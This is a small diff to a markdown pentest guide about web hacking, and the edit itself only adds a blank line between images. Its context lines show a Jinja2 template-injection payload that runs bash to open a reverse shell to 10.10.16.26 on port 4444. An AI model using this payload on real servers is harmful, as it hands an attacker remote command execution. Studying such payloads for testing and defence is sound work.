@@ -30,6 +30,7 @@ Here are some payload examples that in my experience usually work, however, they
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.26/4444 0>&1" ').read() }}
 ```
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/a6610bf1-9f80-454c-9099-3adee2423d49" width="600">
+
 ![6](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/0bbe557f-a638-43fe-ac61-b39e563d3e83)
 
 
